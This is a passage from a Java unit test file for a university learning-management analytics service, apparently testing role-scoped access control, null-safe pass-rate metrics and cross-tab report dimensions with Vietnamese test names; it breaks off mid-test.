package com.hcmute.lms.lmsapi.service;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.assertj.core.api.Assertions.within;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.hcmute.lms.lmsapi.document.AggregateResult;
import com.hcmute.lms.lmsapi.document.Assessment;
import com.hcmute.lms.lmsapi.document.CalculationRun;
import com.hcmute.lms.lmsapi.document.Clo;
import com.hcmute.lms.lmsapi.document.CourseSection;
import com.hcmute.lms.lmsapi.document.Enrollment;
import com.hcmute.lms.lmsapi.document.Plo;
import com.hcmute.lms.lmsapi.document.ProgramCourse;
import com.hcmute.lms.lmsapi.document.Student;
import com.hcmute.lms.lmsapi.document.StudentResult;
import com.hcmute.lms.lmsapi.document.Term;
import com.hcmute.lms.lmsapi.document.User;
import com.hcmute.lms.lmsapi.dto.UserPrincipal;
import com.hcmute.lms.lmsapi.dto.analytics.AnalyticsMatrixResponse;
import com.hcmute.lms.lmsapi.dto.analytics.AnalyticsQueryRequest;
import com.hcmute.lms.lmsapi.dto.analytics.MatrixHeader;
import com.hcmute.lms.lmsapi.dto.analytics.MatrixMetricCell;
import com.hcmute.lms.lmsapi.enums.AccessType;
import com.hcmute.lms.lmsapi.enums.AggregateScopeType;
import com.hcmute.lms.lmsapi.enums.AnalyticsDimension;
import com.hcmute.lms.lmsapi.enums.AssessmentType;
import com.hcmute.lms.lmsapi.enums.CalculationStatus;
import com.hcmute.lms.lmsapi.enums.CourseType;
import com.hcmute.lms.lmsapi.enums.CurriculumClassificationType;
import com.hcmute.lms.lmsapi.enums.EnrollmentStatus;
import com.hcmute.lms.lmsapi.enums.PloCategory;
import com.hcmute.lms.lmsapi.enums.ResultLevel;
import com.hcmute.lms.lmsapi.enums.ResultStatus;
import com.hcmute.lms.lmsapi.enums.Role;
import com.hcmute.lms.lmsapi.exception.BusinessRuleViolationException;
import com.hcmute.lms.lmsapi.exporter.MatrixCsvExporter;
import com.hcmute.lms.lmsapi.exporter.MatrixExcelExporter;
import com.hcmute.lms.lmsapi.repository.AggregateResultRepository;
import com.hcmute.lms.lmsapi.repository.AssessmentRepository;
import com.hcmute.lms.lmsapi.repository.CalculationRunRepository;
import com.hcmute.lms.lmsapi.repository.CloRepository;
import com.hcmute.lms.lmsapi.repository.CourseSectionRepository;
import com.hcmute.lms.lmsapi.repository.EnrollmentRepository;
import com.hcmute.lms.lmsapi.repository.PiRepository;
import com.hcmute.lms.lmsapi.repository.PloRepository;
import com.hcmute.lms.lmsapi.repository.ProgramCourseRepository;
import com.hcmute.lms.lmsapi.repository.ProgramVersionRepository;
import com.hcmute.lms.lmsapi.repository.StudentRepository;
import com.hcmute.lms.lmsapi.repository.StudentResultRepository;
import com.hcmute.lms.lmsapi.repository.TermRepository;
import com.hcmute.lms.lmsapi.repository.UserRepository;
import com.hcmute.lms.lmsapi.service.impl.AnalyticsServiceImpl;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Optional;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.Spy;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.security.access.AccessDeniedException;

@ExtendWith(MockitoExtension.class)
@DisplayName("AnalyticsServiceImpl Unit Tests")
class AnalyticsServiceImplTest {

  @Mock private MongoTemplate mongoTemplate;
  @Mock private CalculationRunRepository calculationRunRepository;
  @Mock private AggregateResultRepository aggregateResultRepository;
  @Mock private StudentResultRepository studentResultRepository;
  @Mock private CourseSectionRepository courseSectionRepository;
  @Mock private TermRepository termRepository;
  @Mock private ProgramCourseRepository programCourseRepository;
  @Mock private CloRepository cloRepository;
  @Mock private PiRepository piRepository;
  @Mock private PloRepository ploRepository;
  @Mock private AssessmentRepository assessmentRepository;
  @Mock private ProgramVersionRepository programVersionRepository;
  @Mock private ScopeAuthorizationService scopeAuthorizationService;
  @Mock private UserRepository userRepository;
  @Mock private StudentRepository studentRepository;
  @Mock private EnrollmentRepository enrollmentRepository;
  @Spy private MatrixCsvExporter matrixCsvExporter = new MatrixCsvExporter();
  @Spy private MatrixExcelExporter matrixExcelExporter = new MatrixExcelExporter();

  @InjectMocks private AnalyticsServiceImpl analyticsService;

  private UserPrincipal adminPrincipal;
  private UserPrincipal qaPrincipal;
  private UserPrincipal pmPrincipal;
  private UserPrincipal lecturerPrincipal;
  private CalculationRun successRun;

  @BeforeEach
  void setUp() {
    adminPrincipal =
        UserPrincipal.builder()
            .id("user_admin")
            .username("admin")
            .roles(List.of(Role.ADMIN))
            .build();

    qaPrincipal =
        UserPrincipal.builder().id("user_qa").username("qa").roles(List.of(Role.QA)).build();

    pmPrincipal =
        UserPrincipal.builder()
            .id("user_pm")
            .username("pm")
            .facultyId("fac_1")
            .roles(List.of(Role.PROGRAM_MANAGER))
            .build();

    lecturerPrincipal =
        UserPrincipal.builder()
            .id("user_lecturer")
            .username("lecturer")
            .roles(List.of(Role.LECTURER))
            .build();

    successRun =
        CalculationRun.builder()
            .id("run_success_1")
            .status(CalculationStatus.SUCCESS)
            .official(true)
            .stale(false)
            .build();

    lenient()
        .when(scopeAuthorizationService.canAccessCalculationRun(any(), any()))
        .thenReturn(true);
  }

  @Nested
  @DisplayName("1. Scope-based Access Control (R3)")
  class ScopeAccessControlTests {

    @Test
    @DisplayName("Ném AccessDeniedException khi principal là null")
    void shouldThrowWhenPrincipalIsNull() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder().dimension(AnalyticsDimension.TIME_TERM).build();

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, null))
          .isInstanceOf(AccessDeniedException.class);
    }

    @Test
    @DisplayName("ADMIN có toàn quyền truy cập toàn hệ thống")
    void shouldAllowAdminAccess() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.TIME_TERM)
              .courseId("course_1")
              .build();

      when(calculationRunRepository.findAllByOrderByStartedAtDesc())
          .thenReturn(List.of(successRun));
      when(termRepository.findAllByOrderByStartDateDesc()).thenReturn(List.of());
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of());

      AnalyticsMatrixResponse response = analyticsService.getAnalyticsMatrix(req, adminPrincipal);
      assertThat(response).isNotNull();
      assertThat(response.getDimension()).isEqualTo(AnalyticsDimension.TIME_TERM);
    }

    @Test
    @DisplayName("QA với Strict Empty Scope có toàn quyền đọc toàn hệ thống")
    void shouldAllowQaWithStrictEmptyScopeAccess() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COHORT)
              .programVersionId("pv_any")
              .build();

      when(calculationRunRepository.findByProgramVersionIdOrderByStartedAtDesc("pv_any"))
          .thenReturn(List.of(successRun));
      when(ploRepository.findByProgramVersionIdOrderByDisplayOrderAsc("pv_any"))
          .thenReturn(List.of());
      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of());
      when(studentResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of());

      AnalyticsMatrixResponse response = analyticsService.getAnalyticsMatrix(req, qaPrincipal);
      assertThat(response).isNotNull();
      assertThat(response.getDimension()).isEqualTo(AnalyticsDimension.COHORT);
    }

    @Test
    @DisplayName("PROGRAM_MANAGER bị từ chối khi truy cập phiên bản CTĐT ngoài phạm vi phụ trách")
    void shouldDenyPmAccessWhenOutOfScope() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COHORT)
              .programVersionId("pv_out_of_scope")
              .build();

      when(scopeAuthorizationService.canAccessProgramVersion(
              pmPrincipal, "pv_out_of_scope", AccessType.READ))
          .thenReturn(false);

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, pmPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Không có quyền truy cập");
    }

    @Test
    @DisplayName(
        "LECTURER bị từ chối khi truy cập lớp học phần không phụ trách trong so sánh song song")
    void shouldDenyLecturerWhenAccessingOtherSection() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_SECTIONS)
              .courseId("course_1")
              .sectionIds(List.of("sec_1", "sec_unauthorized"))
              .build();

      when(scopeAuthorizationService.canAccessSection(lecturerPrincipal, "sec_1", AccessType.READ))
          .thenReturn(true);
      when(scopeAuthorizationService.canAccessSection(
              lecturerPrincipal, "sec_unauthorized", AccessType.READ))
          .thenReturn(false);

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("sec_unauthorized");
    }

    @Test
    @DisplayName("LECTURER bị từ chối khi truy vấn chiều COHORT (chỉ dành cho cấp CTĐT)")
    void shouldDenyLecturerOnCohortDimension() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COHORT)
              .programVersionId("pv_1")
              .build();

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Giảng viên không có quyền truy cập");
    }

    @Test
    @DisplayName(
        "PROGRAM_MANAGER bị từ chối khi truy vấn TIME_TERM mà không truyền tham số phạm vi")
    void shouldDenyPmQueryingTimeTermWithoutParameters() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder().dimension(AnalyticsDimension.TIME_TERM).build();

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, pmPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Quản lý CTĐT phải chỉ định");
    }

    @Test
    @DisplayName("PROGRAM_MANAGER bị từ chối khi truy vấn runId thuộc CTĐT ngoài phạm vi phụ trách")
    void shouldDenyPmAccessingUnauthorizedRunId() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COHORT)
              .programVersionId("pv_1")
              .runId("run_foreign")
              .build();

      CalculationRun foreignRun =
          CalculationRun.builder()
              .id("run_foreign")
              .programVersionId("pv_foreign")
              .status(CalculationStatus.SUCCESS)
              .build();

      when(scopeAuthorizationService.canAccessProgramVersion(pmPrincipal, "pv_1", AccessType.READ))
          .thenReturn(true);
      when(calculationRunRepository.findById("run_foreign")).thenReturn(Optional.of(foreignRun));
      when(scopeAuthorizationService.canAccessProgramVersion(
              pmPrincipal, "pv_foreign", AccessType.READ))
          .thenReturn(false);

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, pmPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Không có quyền truy cập lượt tính toán");
    }

    @Test
    @DisplayName("LECTURER bị từ chối khi truy vấn TIME_TERM mà không có courseId hoặc sectionIds")
    void shouldDenyLecturerQueryingTimeTermWithoutCourseOrSections() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder().dimension(AnalyticsDimension.TIME_TERM).build();

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Giảng viên phải chỉ định học phần hoặc lớp học phần");
    }

    @Test
    @DisplayName("LECTURER bị từ chối khi truy vấn BLOOM_LEVEL mà không chỉ định học phần")
    void shouldDenyLecturerQueryingBloomLevelWithoutCourse() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.CURRICULUM_CLASSIFICATION)
              .classificationType(CurriculumClassificationType.BLOOM_LEVEL)
              .build();

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining(
              "Giảng viên chỉ được xem phân loại chương trình trong phạm vi học phần");
    }

    @Test
    @DisplayName("LECTURER bị từ chối khi truy vấn BLOOM_LEVEL với môn học không phụ trách")
    void shouldDenyLecturerQueryingBloomLevelWithUnassignedCourse() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.CURRICULUM_CLASSIFICATION)
              .classificationType(CurriculumClassificationType.BLOOM_LEVEL)
              .courseId("course_unassigned")
              .build();

      when(scopeAuthorizationService.canAccessCourse(
              lecturerPrincipal, "course_unassigned", AccessType.READ))
          .thenReturn(false);
      when(courseSectionRepository.findByCourseId("course_unassigned")).thenReturn(List.of());

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Không có quyền truy cập học phần");
    }

    @Test
    @DisplayName("LECTURER bị từ chối khi truy vấn runId không thuộc các lớp/học phần giảng dạy")
    void shouldDenyLecturerAccessingUnauthorizedRunId() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_SECTIONS)
              .courseId("course_1")
              .sectionIds(List.of("sec_1"))
              .runId("run_foreign")
              .build();

      CalculationRun foreignRun =
          CalculationRun.builder()
              .id("run_foreign")
              .programVersionId("pv_foreign")
              .status(CalculationStatus.SUCCESS)
              .build();

      when(scopeAuthorizationService.canAccessSection(lecturerPrincipal, "sec_1", AccessType.READ))
          .thenReturn(true);
      when(scopeAuthorizationService.canAccessCourse(
              lecturerPrincipal, "course_1", AccessType.READ))
          .thenReturn(true);
      when(calculationRunRepository.findById("run_foreign")).thenReturn(Optional.of(foreignRun));
      when(programCourseRepository.existsByProgramVersionIdAndCourseId("pv_foreign", "course_1"))
          .thenReturn(false);

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining("Không có quyền truy cập lượt tính toán");
    }

    @Test
    @DisplayName("LECTURER bị từ chối khi truy vấn ASSESSMENT_COMPONENT mà không chỉ định học phần")
    void shouldDenyLecturerQueryingAssessmentComponentWithoutCourse() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.ASSESSMENT_COMPONENT)
              .build();

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining(
              "Giảng viên phải chỉ định học phần phụ trách khi xem phân rã thành phần đánh giá");
    }

    @Test
    @DisplayName(
        "LECTURER bị từ chối khi truy vấn ASSESSMENT_COMPONENT với học phần không phụ trách")
    void shouldDenyLecturerQueryingAssessmentComponentWithUnassignedCourse() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.ASSESSMENT_COMPONENT)
              .courseId("course_unassigned")
              .build();

      when(scopeAuthorizationService.canAccessCourse(
              lecturerPrincipal, "course_unassigned", AccessType.READ))
          .thenReturn(false);
      when(courseSectionRepository.findByCourseId("course_unassigned")).thenReturn(List.of());

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, lecturerPrincipal))
          .isInstanceOf(AccessDeniedException.class)
          .hasMessageContaining(
              "Giảng viên phải chỉ định học phần phụ trách khi xem phân rã thành phần đánh giá");
    }

    @Test
    @DisplayName(
        "PROGRAM_MANAGER bị từ chối khi truy vấn ASSESSMENT_COMPONENT với CTĐT ngoài phạm vi")
    void shouldDenyPmQueryingAssessmentComponentWithUnauthorizedProgramVersion() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.ASSESSMENT_COMPONENT)
              .programVersionId("pv_foreign")
              .build();

      when(scopeAuthorizationService.canAccessProgramVersion(
              pmPrincipal, "pv_foreign", AccessType.READ))
          .thenReturn(false);

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, pmPrincipal))
          .isInstanceOf(AccessDeniedException.class);
    }

    @Test
    @DisplayName(
        "findClosForCourse trả về danh sách rỗng (fail-closed) khi courseId là null hoặc blank")
    void shouldReturnEmptyListWhenCourseIdIsNullOrEmptyInFindClosForCourse() {
      assertThat(analyticsService.findClosForCourse(null)).isEmpty();
      assertThat(analyticsService.findClosForCourse("")).isEmpty();
      assertThat(analyticsService.findClosForCourse("   ")).isEmpty();
    }
  }

  @Nested
  @DisplayName("2. Zero Denominator Null Safety (R2)")
  class ZeroDenominatorTests {

    @Test
    @DisplayName("evaluated == 0 trả về passRate = null và mean = null")
    void shouldReturnNullWhenEvaluatedIsZero() {
      MatrixMetricCell cell = MatrixMetricCell.calculate(30, 0, 0, 0.75, null, true, false);

      assertThat(cell.getEnrolled()).isEqualTo(30);
      assertThat(cell.getEvaluated()).isEqualTo(0);
      assertThat(cell.getPassed()).isEqualTo(0);
      assertThat(cell.getFailed()).isEqualTo(0);
      assertThat(cell.getInsufficientData()).isEqualTo(30);
      assertThat(cell.getMean()).isNull();
      assertThat(cell.getPassRate()).isNull();
      assertThat(cell.getPassRateOfEnrolled()).isNull();
      assertThat(cell.getIsOfficial()).isTrue();
      assertThat(cell.getIsStale()).isFalse();
    }

    @Test
    @DisplayName("enrolled == 0 trả về passRateOfEnrolled = null")
    void shouldReturnNullWhenEnrolledIsZero() {
      MatrixMetricCell cell = MatrixMetricCell.calculate(0, 0, 0, null, null, true, false);

      assertThat(cell.getEnrolled()).isEqualTo(0);
      assertThat(cell.getEvaluated()).isEqualTo(0);
      assertThat(cell.getPassRateOfEnrolled()).isNull();
      assertThat(cell.getPassRate()).isNull();
      assertThat(cell.getMean()).isNull();
    }

    @Test
    @DisplayName("evaluated > 0 nhưng passed == 0 trả về số 0.0 thực sự, không phải null")
    void shouldReturnZeroNumericWhenEvaluatedPositiveAndPassedZero() {
      MatrixMetricCell cell = MatrixMetricCell.calculate(20, 0, 15, 0.35, null, true, false);

      assertThat(cell.getEnrolled()).isEqualTo(20);
      assertThat(cell.getEvaluated()).isEqualTo(15);
      assertThat(cell.getPassed()).isEqualTo(0);
      assertThat(cell.getFailed()).isEqualTo(15);
      assertThat(cell.getInsufficientData()).isEqualTo(5);
      assertThat(cell.getMean()).isEqualTo(0.35);
      assertThat(cell.getPassRate()).isEqualTo(0.0);
      assertThat(cell.getPassRateOfEnrolled()).isEqualTo(0.0);
    }
  }

  @Nested
  @DisplayName("3. Source of Truth & Calculation Run Validation (R2)")
  class CalculationRunValidationTests {

    @Test
    @DisplayName(
        "Bị từ chối với BusinessRuleViolationException nếu lượt tính chỉ định có status FAILED")
    void shouldRejectFailedCalculationRun() {
      CalculationRun failedRun =
          CalculationRun.builder().id("run_failed").status(CalculationStatus.FAILED).build();

      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.TIME_TERM)
              .runId("run_failed")
              .build();

      when(calculationRunRepository.findById("run_failed")).thenReturn(Optional.of(failedRun));

      assertThatThrownBy(() -> analyticsService.getAnalyticsMatrix(req, adminPrincipal))
          .isInstanceOf(BusinessRuleViolationException.class)
          .hasMessageContaining("Chỉ được tổng hợp dữ liệu từ lượt tính có trạng thái SUCCESS");
    }

    @Test
    @DisplayName("Propagate isOfficial và isStale từ CalculationRun vào toàn bộ các ô ma trận")
    void shouldPropagateRunOfficialAndStaleFlags() {
      CalculationRun staleOfficialRun =
          CalculationRun.builder()
              .id("run_stale_official")
              .status(CalculationStatus.SUCCESS)
              .official(true)
              .stale(true)
              .build();

      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_SECTIONS)
              .courseId("crs_1")
              .runId("run_stale_official")
              .build();

      CourseSection sec =
          CourseSection.builder().id("sec_1").code("OOP_01").courseId("crs_1").build();
      Clo clo =
          Clo.builder().id("clo_1").code("CLO1").contentOriginal("Đóng gói").bloomLevel(2).build();

      when(calculationRunRepository.findById("run_stale_official"))
          .thenReturn(Optional.of(staleOfficialRun));
      when(courseSectionRepository.findByCourseId("crs_1")).thenReturn(List.of(sec));
      when(scopeAuthorizationService.canAccessLoadedSection(any(), any(), any())).thenReturn(true);
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo));

      AggregateResult agg =
          AggregateResult.builder()
              .runId("run_stale_official")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .sectionId("sec_1")
              .counts(AggregateResult.Counts.builder().enrolled(40).passed(35).failed(5).build())
              .mean(0.78)
              .passRate(0.875)
              .build();
      when(aggregateResultRepository.findByRunIdAndLevel("run_stale_official", ResultLevel.CLO))
          .thenReturn(List.of(agg));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getIsOfficial()).isTrue();
      assertThat(resp.getIsStale()).isTrue();
      assertThat(resp.getMatrix()).hasSize(1);
      MatrixMetricCell cell = resp.getMatrix().get(0).get(0);
      assertThat(cell.getIsOfficial()).isTrue();
      assertThat(cell.getIsStale()).isTrue();
      assertThat(cell.getEnrolled()).isEqualTo(40);
      assertThat(cell.getEvaluated()).isEqualTo(40);
      assertThat(cell.getPassed()).isEqualTo(35);
      assertThat(cell.getFailed()).isEqualTo(5);
      assertThat(cell.getPassRate()).isEqualTo(0.875);
    }
  }

  @Nested
  @DisplayName("4. 5 Cross-Tab Dimensions Functionality (R1)")
  class FiveDimensionsTests {

    @Test
    @DisplayName("D1: TIME_TERM tổng hợp xu hướng theo các học kỳ")
    void testTimeTermDimension() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.TIME_TERM)
              .courseId("crs_1")
              .termIds(List.of("term_1", "term_2"))
              .runId("run_success_1")
              .build();

      Term t1 = Term.builder().id("term_1").code("2024-HK1").academicYear("2024-2025").build();
      Term t2 = Term.builder().id("term_2").code("2024-HK2").academicYear("2024-2025").build();
      Clo clo =
          Clo.builder().id("clo_1").code("CLO1").contentOriginal("Đóng gói").bloomLevel(2).build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(termRepository.findAllById(List.of("term_1", "term_2"))).thenReturn(List.of(t1, t2));
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo));

      AggregateResult agg1 =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.CLO)
              .subjectId("clo_1")
              .scope(AggregateResult.Scope.builder().termId("term_1").build())
              .counts(AggregateResult.Counts.builder().enrolled(50).passed(40).failed(10).build())
              .mean(0.72)
              .build();

      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
          .thenReturn(List.of(agg1));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getColumns()).hasSize(2);
      assertThat(resp.getRows()).hasSize(1);
      assertThat(resp.getRows().get(0).getCode()).isEqualTo("CLO1");
      // term_1 có dữ liệu
      MatrixMetricCell cell1 = resp.getMatrix().get(0).get(0);
      assertThat(cell1.getEnrolled()).isEqualTo(50);
      assertThat(cell1.getEvaluated()).isEqualTo(50);
      assertThat(cell1.getPassed()).isEqualTo(40);
      assertThat(cell1.getMean()).isEqualTo(0.72);
      // term_2 rỗng -> null rates
      MatrixMetricCell cell2 = resp.getMatrix().get(0).get(1);
      assertThat(cell2.getEvaluated()).isEqualTo(0);
      assertThat(cell2.getPassRate()).isNull();
      assertThat(cell2.getMean()).isNull();
    }

    @Test
    @DisplayName("D2: COURSE_SECTIONS so sánh các lớp song song trong cùng môn")
    void testCourseSectionsDimension() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COURSE_SECTIONS)
              .courseId("crs_1")
              .runId("run_success_1")
              .build();

      CourseSection s1 =
          CourseSection.builder().id("sec_1").code("OOP_01").courseId("crs_1").build();
      CourseSection s2 =
          CourseSection.builder().id("sec_2").code("OOP_02").courseId("crs_1").build();
      Clo clo =
          Clo.builder().id("clo_1").code("CLO1").contentOriginal("Đa hình").bloomLevel(3).build();

      stubCourseSectionsCloScenario("crs_1", List.of(s1, s2), clo, 30, 27, 3, 0.81, 0.90);

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getColumns()).extracting("code").containsExactly("OOP_01", "OOP_02");
      assertThat(resp.getRows()).extracting("code").containsExactly("CLO1");
      assertThat(resp.getMatrix().get(0).get(0).getPassRate()).isEqualTo(0.90);
      assertThat(resp.getMatrix().get(0).get(1).getPassRate()).isNull();
    }

    @Test
    @DisplayName("D3: COHORT đối sánh chuẩn đầu ra theo khóa tuyển sinh")
    void testCohortDimension() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.COHORT)
              .programVersionId("pv_cntt")
              .cohorts(List.of("K23", "K24"))
              .level(ResultLevel.PLO)
              .runId("run_success_1")
              .build();

      Plo plo = Plo.builder().id("plo_1").code("PLO1").contentSummary("Áp dụng toán").build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(ploRepository.findByProgramVersionIdOrderByDisplayOrderAsc("pv_cntt"))
          .thenReturn(List.of(plo));

      AggregateResult aggK23 =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.PLO)
              .subjectId("plo_1")
              .scope(
                  AggregateResult.Scope.builder()
                      .type(AggregateScopeType.COHORT)
                      .cohort("K23")
                      .build())
              .counts(AggregateResult.Counts.builder().enrolled(120).passed(100).failed(20).build())
              .mean(0.76)
              .passRate(0.833)
              .build();

      when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of(aggK23));
      when(studentResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.PLO))
          .thenReturn(List.of());

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getColumns()).extracting("code").containsExactly("K23", "K24");
      assertThat(resp.getRows()).extracting("code").containsExactly("PLO1");
      assertThat(resp.getMatrix().get(0).get(0).getEnrolled()).isEqualTo(120);
      assertThat(resp.getMatrix().get(0).get(1).getPassRate()).isNull();
    }

    @Test
    @DisplayName("D4: ASSESSMENT_COMPONENT phân rã theo loại bài đánh giá")
    void testAssessmentComponentDimension() {
      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.ASSESSMENT_COMPONENT)
              .courseId("crs_1")
              .assessmentTypes(List.of(AssessmentType.QUIZ, AssessmentType.FINAL))
              .runId("run_success_1")
              .build();

      Clo clo = Clo.builder().id("clo_1").code("CLO1").contentOriginal("OOP").bloomLevel(2).build();
      Assessment aQuiz = Assessment.builder().id("ass_quiz").type(AssessmentType.QUIZ).build();
      Assessment aFinal = Assessment.builder().id("ass_final").type(AssessmentType.FINAL).build();

      when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo));
      when(assessmentRepository.findAll()).thenReturn(List.of(aQuiz, aFinal));

      AggregateResult aggQuiz =
          AggregateResult.builder()
              .runId("run_success_1")
              .level(ResultLevel.ASSESSMENT_CLO)
              .subjectId("clo_1")
              .assessmentId("ass_quiz")
              .counts(AggregateResult.Counts.builder().enrolled(40).passed(36).failed(4).build())
              .mean(0.82)
              .build();

      when(aggregateResultRepository.findByRunIdAndLevel(
              "run_success_1", ResultLevel.ASSESSMENT_CLO))
          .thenReturn(List.of(aggQuiz));

      AnalyticsMatrixResponse resp = analyticsService.getAnalyticsMatrix(req, adminPrincipal);

      assertThat(resp.getColumns()).extracting("code").containsExactly("QUIZ", "FINAL");
      assertThat(resp.getMatrix().get(0).get(0).getPassed()).isEqualTo(36);
      assertThat(resp.getMatrix().get(0).get(1).getPassRate()).isNull();
    }

    @Test
    @DisplayName("D4: PM truy vấn ASSESSMENT_COMPONENT chỉ lấy CLO thuộc các môn trong CTĐT")
    void testPmQueryingAssessmentComponentScopesClosToProgramVersionCourses() {
      CalculationRun pmRun =
          CalculationRun.builder()
              .id("run_pm_success")
              .programVersionId("pv_pm")
              .status(CalculationStatus.SUCCESS)
              .official(true)
              .stale(false)
              .build();

      AnalyticsQueryRequest req =
          AnalyticsQueryRequest.builder()
              .dimension(AnalyticsDimension.ASSESSMENT_COMPONENT)
              .programVersionId("pv_pm")
              .assessmentTypes(List.of(AssessmentType.QUIZ))
              .runId("run_pm_success")
              .build();

      when(scopeAuthorizationService.canAccessProgramVersion(pmPrincipal, "pv_pm", AccessType.READ))
          .thenReturn(true);
      when(calculationRunRepository.findById("run_pm_success")).thenReturn(Optional.of(pmRun));

      ProgramCourse pc =
          ProgramCourse.builder().programVersionId("pv_pm").courseId("crs_pv_1").build();
      when(programCourseRepository.findByProgramVersionIdOrderBySemesterAscCourseIdAsc("pv_pm"))
          .thenReturn(List.of(pc));

      Clo clo =
          Clo.builder()
              .id("clo_pv_1")
              .courseId("crs_pv_1")
              .code("CLO_PV1")
              .contentOriginal("CLO in program")
              .bloomLevel(2)
              .build();
      when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo));

      Assessment aQuiz = Assessment.builder().id("ass_quiz").type(AssessmentType.QUIZ).build();
      when(assessmentRepository.findAll()).thenReturn(List.of(aQuiz));

      AggregateResult aggQuiz =
          AggregateResult.builder()
